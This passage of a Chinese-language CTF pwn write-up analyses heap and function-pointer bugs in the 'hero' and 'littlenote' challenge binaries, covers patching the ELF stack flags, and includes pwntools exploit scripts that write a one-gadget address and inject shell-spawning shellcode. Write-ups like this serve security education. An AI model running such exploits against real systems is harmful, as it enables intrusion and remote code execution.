class="line">log.info(<span class="string">"libc address:%#x"</span>,libc_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x5ee000 is offset of libc and mmap</span></span><br><span class="line">maybe = ((libc_addr+<span class="number">0x5ee000</span>)&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> maybe &lt;<span class="number">0x70</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'bad luck :('</span></span><br><span class="line"></span><br><span class="line">create(<span class="string">"0gur1"</span>,<span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">	value = ((libc_addr+gadget[<span class="number">0</span>])&gt;&gt;<span class="number">8</span>*i)&amp;<span class="number">0xff</span></span><br><span class="line">	where = <span class="number">0x1000</span>*i+<span class="number">0x1020</span>+i</span><br><span class="line">	write_one(where,value)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write the 2nd last byte</span></span><br><span class="line">where = <span class="number">0x1000</span>*<span class="number">6</span>+<span class="number">0x1000</span>+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">write_one(where,maybe)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="hero"><a href="#hero" class="headerlink" title="hero"></a>hero</h1><h2 id="基本逻辑-1"><a href="#基本逻辑-1" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Do you want to be superhero?</span><br><span class="line"><span class="number">1.</span> add hero</span><br><span class="line"><span class="number">2.</span> show hero</span><br><span class="line"><span class="number">3.</span> edit hero</span><br><span class="line"><span class="number">4.</span> remove hero</span><br><span class="line"><span class="number">5.</span> <span class="built_in">exit</span></span><br><span class="line"><span class="number">6.</span> math</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure>
+<p>add函数输入name和power，这两个数组均位于bss。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; name[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't add more heros!"</span>);</span><br><span class="line">  name[i] = <span class="built_in">malloc</span>(<span class="number">0x68</span>uLL);                    <span class="comment">// fastbin</span></span><br><span class="line">  power[i] = <span class="built_in">malloc</span>(<span class="number">0xF8</span>uLL);                   <span class="comment">// small bin</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's your hero's name:"</span>);</span><br><span class="line">  v1 = name[i];</span><br><span class="line">  v1[read(<span class="number">0</span>, name[i], <span class="number">0x68</span>uLL)] = <span class="number">0</span>;            <span class="comment">// off by one</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's your hero's power:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, power[i], <span class="number">0xF8</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>show函数输出name和power，这里由于v1是unsigned int，不会出现数组越界的问题。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What hero do you want to show?"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> &amp;&amp; name[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hero:%s\nPower:%s\n"</span>, name[v1], power[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No such hero!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>edit函数将name和power都释放并重新分配。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What hero do you want to edit?"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  v2 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">9</span> &amp;&amp; name[v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(name[v2]);</span><br><span class="line">    name[v2] = <span class="built_in">malloc</span>(<span class="number">0x68</span>uLL);                 </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"What's your hero's name:"</span>);</span><br><span class="line">    v0 = name[v2];</span><br><span class="line">    v0[read(<span class="number">0</span>, name[v2], <span class="number">0x68</span>uLL)] = <span class="number">0</span>;         <span class="comment">// off by one</span></span><br><span class="line">    <span class="built_in">free</span>(power[v2]);						  <span class="comment">// leak bk</span></span><br><span class="line">    power[v2] = <span class="built_in">malloc</span>(<span class="number">0xF8</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"What's your hero's power:"</span>);</span><br><span class="line">    read(<span class="number">0</span>, power[v2], <span class="number">0xF8</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No such hero!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>dele函数释放name和power对应的内存。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What hero do you want to remove?"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> &amp;&amp; name[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(name[v1]);</span><br><span class="line">    <span class="built_in">free</span>(power[v1]);</span><br><span class="line">    name[v1] = <span class="number">0L</span>L;</span><br><span class="line">    power[v1] = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No such hero!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>math函数做一些简单的运算，运算函数地址存放在funcs中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">math</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  __int64 (__fastcall *v5)(_QWORD, _QWORD); <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"What do you want to do?\n"</span></span><br><span class="line">    <span class="string">"1. Add two numbers\n"</span></span><br><span class="line">    <span class="string">"2. Subtract two numbers\n"</span></span><br><span class="line">    <span class="string">"3. Multiply two numbers\n"</span></span><br><span class="line">    <span class="string">"4. Divide two numbers"</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read_integers((__int64)&amp;v1, (__int64)&amp;v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"You chose: %d\nPlease input two numbers to do math with\n"</span>, v1);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read_integers((__int64)&amp;v2, (__int64)&amp;v3);</span><br><span class="line">  v5 = (__int64 (__fastcall *)(_QWORD, _QWORD))*(&amp;funcs + (<span class="keyword">signed</span> <span class="keyword">int</span>)(v1 - <span class="number">1</span>));</span><br><span class="line">  v4 = v5(v2, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Result: %d\n"</span>, v4);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">read_integers</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  fgets(buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_sscanf(buf, <span class="string">"%d %d"</span>, a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>funcs：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:00000000006020A0 funcs           dq offset add1          ; DATA XREF: math+81↑r</span><br><span class="line">.data:00000000006020A8                 dq offset subtract</span><br><span class="line">.data:00000000006020B0                 dq offset multiply</span><br><span class="line">.data:00000000006020B8                 dq offset divide</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞及利用-1"><a href="#漏洞及利用-1" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h2><p>这题很明显的一点是，没有开启NX保护。再加上执行(funcs+v1)(v2,v3)函数时，并没有对v1的数值进行检查，能够将shellcode写入到bss段上并执行。patch的方法是修改elf文件的堆栈读写权限，以及限制v1的大小。</p>
+<p>修改读写权限是和echo大佬学的。ELF文件头Elf64_Ehdr中有一个e_phoff字段，描述了program header的偏移，在IDA中通过这个值找到program header。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];     <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf64_Half    e_type;                 <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf64_Half    e_machine;              <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf64_Word    e_version;              <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf64_Addr    e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf64_Off     e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf64_Off     e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf64_Word    e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf64_Half    e_ehsize;               <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf64_Half    e_phentsize;            <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf64_Half    e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf64_Half    e_shentsize;            <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf64_Half    e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf64_Half    e_shstrndx;             <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000400000 dword_400000    dd 464C457Fh            ; DATA XREF: LOAD:00000000004000C0↓o</span><br><span class="line">LOAD:0000000000400000                                         ; File format: \x7FELF</span><br><span class="line">LOAD:0000000000400004                 db 2                    ; File class: 64-bit</span><br><span class="line">LOAD:0000000000400005                 db 1                    ; Data encoding: little-endian</span><br><span class="line">LOAD:0000000000400006                 db 1                    ; File version</span><br><span class="line">LOAD:0000000000400007                 db 0                    ; OS/ABI: UNIX System V ABI</span><br><span class="line">LOAD:0000000000400008                 db 0                    ; ABI Version</span><br><span class="line">LOAD:0000000000400009                 db 7 dup(0)             ; Padding</span><br><span class="line">LOAD:0000000000400010                 dw 2                    ; File type: Executable</span><br><span class="line">LOAD:0000000000400012                 dw 3Eh                  ; Machine: x86-64</span><br><span class="line">LOAD:0000000000400014                 dd 1                    ; File version</span><br><span class="line">LOAD:0000000000400018                 dq offset _start        ; Entry point</span><br><span class="line">LOAD:0000000000400020                 dq 40h  here!!!!!!!!!!! ; PHT file offset</span><br><span class="line">LOAD:0000000000400028                 dq 2EB0h                ; SHT file offset</span><br><span class="line">LOAD:0000000000400030                 dd 0                    ; Processor-specific flags</span><br><span class="line">LOAD:0000000000400034                 dw 40h                  ; ELF header size</span><br><span class="line">LOAD:0000000000400036                 dw 38h                  ; PHT entry size</span><br><span class="line">LOAD:0000000000400038                 dw 9                    ; Number of entries in PHT</span><br><span class="line">LOAD:000000000040003A                 dw 40h                  ; SHT entry size</span><br><span class="line">LOAD:000000000040003C                 dw 1Fh                  ; Number of entries in SHT</span><br><span class="line">LOAD:000000000040003E                 dw 1Ch                  ; SHT entry index for string table</span><br></pre></td></tr></table></figure>
+<p>在Program Header中找到一个Type为STACK的节区入口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00000000004001C8 ; PHT Entry 7</span><br><span class="line">LOAD:00000000004001C8                 dd 6474E551h            ; Type: STACK</span><br><span class="line">LOAD:00000000004001CC                 dd 7                    ; Flags</span><br><span class="line">LOAD:00000000004001D0                 dq 0                    ; File offset</span><br><span class="line">LOAD:00000000004001D8                 dq 0                    ; Virtual address</span><br><span class="line">LOAD:00000000004001E0                 dq 0                    ; Physical address</span><br><span class="line">LOAD:00000000004001E8                 dq 0                    ; Size in file image</span><br><span class="line">LOAD:00000000004001F0                 dq 0                    ; Size in memory image</span><br><span class="line">LOAD:00000000004001F8                 dq 10h                  ; Alignment</span><br></pre></td></tr></table></figure>
+<p>其中Flags处对应的就是这一节区的权限，修改为6，去掉执行权限。</p>
+<p>不知道这题还有其他什么办法利用？本想着off by one修改堆块的size，利用unlink修改数组内容，但是edit每次都要free再重新malloc，这种方法就没有成功。</p>
+<h2 id="利用脚本-1"><a href="#利用脚本-1" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(ip=<span class="string">'127.0.0.1'</span>)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> debug:</span><br><span class="line">		p = process(<span class="string">'./hero'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(ip,<span class="number">8089</span>)	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,power)</span>:</span></span><br><span class="line">		p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="string">'1'</span>)</span><br><span class="line">		p.sendafter(<span class="string">"What's your hero's name:\n"</span>,name)</span><br><span class="line">		p.sendafter(<span class="string">"What's your hero's power:\n"</span>,power)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">		p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="string">'2'</span>)</span><br><span class="line">		p.sendlineafter(<span class="string">"What hero do you want to show?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,name,power)</span>:</span></span><br><span class="line">		p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="string">'3'</span>)</span><br><span class="line">		p.sendlineafter(<span class="string">"What hero do you want to edit?\n"</span>,str(idx))</span><br><span class="line">		p.sendafter(<span class="string">"What's your hero's name:\n"</span>,name)</span><br><span class="line">		p.sendafter(<span class="string">"What's your hero's power:\n"</span>,power)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">		p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="string">'4'</span>)</span><br><span class="line">		p.sendlineafter(<span class="string">"What hero do you want to remove?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">math</span><span class="params">(choice,a,b)</span>:</span></span><br><span class="line">		p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="string">'6'</span>)</span><br><span class="line">		p.sendlineafter(<span class="string">"4. Divide two numbers\n"</span>,str(choice))</span><br><span class="line">		p.sendlineafter(<span class="string">"Please input two numbers to do math with\n"</span>,str(a)+<span class="string">" "</span>+str(b))</span><br><span class="line">	name_addr = <span class="number">0x602160</span></span><br><span class="line">	power_addr = <span class="number">0x602100</span></span><br><span class="line"></span><br><span class="line">	payload = asm(shellcraft.sh())</span><br><span class="line">	add(<span class="string">'000\n'</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	math(<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+<h1 id="littlenote"><a href="#littlenote" class="headerlink" title="littlenote"></a>littlenote</h1><h2 id="基本逻辑-2"><a href="#基本逻辑-2" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p>addnote添加note，其中notenum和note数组位于bss上。当询问是否保存note时，如果输入’N’则会重新分配一个0x20大小的块。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">addnote</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)notenum &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"FULL"</span>);</span><br><span class="line">  v0 = notenum;</span><br><span class="line">  note[v0] = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter your note"</span>);</span><br><span class="line">  read(<span class="number">0</span>, note[notenum], <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Want to keep your note?"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">7u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">78</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"OK,I will leave a backup note for you"</span>);</span><br><span class="line">    <span class="built_in">free</span>(note[notenum]);</span><br><span class="line">    v1 = notenum;</span><br><span class="line">    note[v1] = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  ++notenum;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>shownote展示note内容。</p>
